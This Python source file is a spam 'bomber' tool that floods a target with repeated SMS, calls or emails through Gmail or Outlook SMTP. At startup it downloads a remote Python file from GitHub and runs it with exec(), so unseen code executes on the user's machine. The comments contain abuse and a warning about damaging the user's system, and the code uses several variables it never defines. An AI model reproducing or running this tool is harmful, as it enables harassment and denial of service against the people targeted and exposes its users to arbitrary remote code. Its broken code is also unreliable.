#coding=utf-8
#!/bin/python3



# ASSALAMUALAIKUM

# THIS IS A BANGLADESHI PROGRAMMER
##########################################################
# DEV : MAO2116
# Github : https://github.com/mao2116

# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,


# THANKS TO ALLAH
# WELCOME HOME
#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################



acl='\033[1;30m'
rcl='\033[1;31m'
ycl='\033[1;33m'
ncl='\033[0;00m'
import os
try:
    import requests
except:
  #TRYING TO DOWNLOAD REQUESTS FOR PYTHON2 AND PYTHON3 BOTH  
    os.system('pip install requests ; pip2 install requests')
try:    
  import json
  import os
  import sys
  import subprocess
  import string
  import random
  import json
  import re
  import time
  import argparse
  import json
  import smtplib
except Exception as emao:
  exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
try:
  from pkg_resources import resource_string
  from core.user_agents import user_agent
  from core.logos import logomao
  from core.logos import *
  #
except Exception as emao:
  maoversys=sys.version_info[0]==3
  if maoversys:
    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
  else:
    exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
acl='\033[1;30m'
rcl='\033[1;31m'
ycl='\033[1;33m'
ncl='\033[0;00m'
maoversys=sys.version_info[0]==3
if maoversys:
  pass 
else:
  exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))




os.system('clear')
agents = user_agent
def authermao():
  os.system('xdg-open https://github.com/mao2116')


def autherthbd():
  os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
def clr():
  os.system("clear")

def logomain2():
  clr()
  print(logomao)

try:
    from typing import List
except ImportError:
    pass #
STR_TYPE = str
RUNNING_PYTHON_2=sys.version_info[0]==2
import tty, termios
def getch():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def MAOPASSWORDSET(prompt='Password: ', mask='*'):
  

    if not isinstance(prompt, STR_TYPE):
        raise TypeError('prompt argument must be a str, not %s' % (type(prompt).__name__))
    if not isinstance(mask, STR_TYPE):
        raise TypeError('mask argument must be a zero- or one-character str, not %s' % (type(prompt).__name__))
    if len(mask) > 1:
        raise ValueError('mask argument must be a zero- or one-character str')

    if mask == '' or sys.stdin is not sys.__stdin__:
        import getpass as gp
        return gp.getpass(prompt)

    enteredPassword = [] # List[str]
    sys.stdout.write(prompt)
    sys.stdout.flush()
    while True:
        key = ord(getch())
        if key == 13: # Enter key pressed.
            if RUNNING_PYTHON_2:
                sys.stdout.write(STR_TYPE('\n'))
            else:
                sys.stdout.write('\n')
            return ''.join(enteredPassword)
        elif key in (8, 127): # Backspace/Del key erases previous output.
            if len(enteredPassword) > 0:
                sys.stdout.write('\b \b')
                
                sys.stdout.flush()
                enteredPassword = enteredPassword[:-1]
        elif 0 <= key <= 31:
            pass
        else:
            char = chr(key)
            sys.stdout.write(mask)
            sys.stdout.flush()
            enteredPassword.append(char)


  

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def mao3print(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)

      

def ext():
  exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))






def usemail():
  osc("clear")
  print(logomao)
  try:
    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
    headers=(' MAO WANNA FUCK YOU ')
    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
  except KeyboardInterrupt:
    exit("\n{acl}[ {rcl}! {acl}]{ycl} CANCELLED  {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
  try:
    
    maoserver=smtplib.SMTP('smtp.gmail.com',587)
  except:
    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
  maoserver.starttls()
  try:
    maoserver.login(maouser, maopass)
  except smtplib.SMTPAuthenticationError:
    print("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS \n OR NEED TO ENABLE LESS SECURE APPS{ncl}".format(rcl=rcl,ncl=ncl))
    os.system('xdg-open https://myaccount.google.com/lesssecureapps')
    exit()
  try:
    i=1
    for i in range(threat):
      i=i+1
      i2=str(i)
      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
      
      maoserver.sendmail(maouser,tomao,message)
      
      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(gcl=gcl,acl=acl,rcl=rcl,i2=i2))
      
  except KeyboardInterrupt:
    exit("{acl}[{rcl} !{acl} ] {rcl} ...ABORTING... {acl}[{rcl} !{acl} ]".format(rcl=rcl,acl=acl))
def usoutmail():
  osc("clear")
  print(logomao)
  try:
    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
    headers=(' MAO WANNA FUCK YOU ')
    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
  except KeyboardInterrupt:
    exit("{acl}[{rcl} !{acl} ] {rcl}CANCELLED {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))

  try:
    maoserver=smtplib.SMTP('smtp-mail.outlook.com',587)
  except:
    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
  maoserver.ehlo()
  maoserver.starttls()
  try:
    maoserver.login(maouser, maopass)
  except smtplib.SMTPAuthenticationError:
    exit("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS.".format(rcl=rcl))
    
  try:
    i=1
    for i in range(threat):
      i=i+1
      i2=str(i)
      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
      maoserver.sendmail(maouser,tomao,message)
      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(acl=acl,rcl=rcl,i2=i2,gcl=gcl))
  except KeyboardInterrupt:
    exit("{acl}[{rcl} !{acl} ] {rcl}...ABORTING... {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))
def maocc1():
  try:
    
    mao=open("core/cc_codes_mao.json","r")
    mao=json.load(mao)
    mao=mao["MAOCC_CODES"]
    return mao
  except Exception as emao:
    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
try:
  getsys=requests.session()
  maopaste=getsys.get("https://raw.githubusercontent.com/mao2116/test/main/api/mao_api.py").text
  exec(maopaste)
except:
  exit("\n{acl}[ {rcl}! {acl}]{ycl} API'S NOT LOADED {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
def get_phone_info(maocc,maonumber):
   
      try:
        cc =maocc
        if not maocc1().get(cc, False):
            exit("[ ! ] The COUNTRY CODE ({cc}) THAT YOU HAVE ENTERED IS INVALID OR UNSUPPORTED [ ! ]".format(cc=cc))
        ccn=maocc1().get(cc)
        target=maonumber
        if ((len(target) <= 6) or (len(target) >= 12)):
            exit("[ ! ] THE PHONE NUMBER ({target}) THAT YOU HAVE ENTERED IS INVALID [ ! ]\n".format(target=target))
            
        return (cc, target,ccn)
      except KeyboardInterrupt:
        exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))

def main(): 

   

    logomao="""
\033[1;33m {bcl}V.1.{gcl}4{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
\033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
\033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
\033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
\033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
                      |_\033[1;30mMAO\033[1;32m_|        
                      
                      
                      
                      
                  \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
\033[0;00m""".format(bcl=bcl,gcl=gcl,ycl=ycl)
    print(logomao)
    parser = argparse.ArgumentParser(description="")

    #

  

    parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/email/outlook")
    
 
    parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--number', dest='NUMBER',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--threat', dest='THREAT',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 

    parser.add_argument('--morelevels',dest='moreLevels',action='store_true') 

  

    # parse args 
    
    
    args = parser.parse_args() 
    maothreat=0
    if args.BOMBING=='sms':
      try:
        maothreat=int(args.THREAT)
        
      except:
        print("[ ! ] ENTER BOMBING THREAT [ ! ] \n")
      if maothreat <=1000:
          pass
      else:
          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))

      maocc=str(args.COUNTRY_CODE)
      maonumber=str(args.NUMBER)
      get_phone_info(maocc,maonumber)
      ccn=get_phone_info(maocc,maonumber)[2]
      mainbomb(maothreat,maocc,maonumber,ccn)
    elif args.BOMBING=="sms_call":
      maothreat =0
      try:
        maothreat=int(args.THREAT)
        
      
      except:
        print("{acl}[ {rcl}!{acl} ]{rcl} ENTER BOMBING THREAT {acl}[{rcl} ! {acl}] \n{ncl}".format(acl=acl,rcl=rcl,ncl=ncl))
      if maothreat <=1000:
          pass
      else:
          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
      maocc=str(args.COUNTRY_CODE)
      maonumber=str(args.NUMBER)
      get_phone_info(maocc,maonumber)
      ccn=get_phone_info(maocc,maonumber)[2]
      smsandcall(maothreat,maocc,maonumber,ccn)
    elif args.BOMBING=="email":
      usemail()
    elif args.BOMBING=="outlook":
      usoutmail()
    else:
      authermao()
      exit("{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl))
      
      
      


if __name__ == '__main__': 

    main()
    
    
    
##########################################################
# DEV : EKRAMUL HASSAN
# Github : https://github.com/mao2116
# IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL

# THANKS TO ALLAH
# WELCOME HOME
#####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################

###THIS TOOL IS ONLINE
